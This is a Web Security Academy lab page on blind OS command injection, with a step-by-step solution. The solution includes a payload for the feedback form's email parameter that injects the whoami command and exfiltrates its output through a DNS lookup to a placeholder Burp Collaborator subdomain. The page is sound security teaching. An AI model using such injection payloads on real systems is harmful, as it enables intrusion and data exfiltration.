# Lab: Blind OS command injection with out-of-band data exfiltration

Source: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
Fetched: 2026-06-28T09:17:59.320877+00:00

Web Security Academy

OS command injection

Lab

Lab: Blind OS command injection with out-of-band data exfiltration

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Solution

Use Burp Suite Professional to intercept and modify the request that submits feedback.

Go to the Collaborator tab.

Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.

Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:

email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||

Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.

Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.

To complete the lab, enter the name of the current user.

Community solutions

Rana Khalil

Michael Sommer

Find OS command injection vulnerabilities using Burp Suite

Try for free
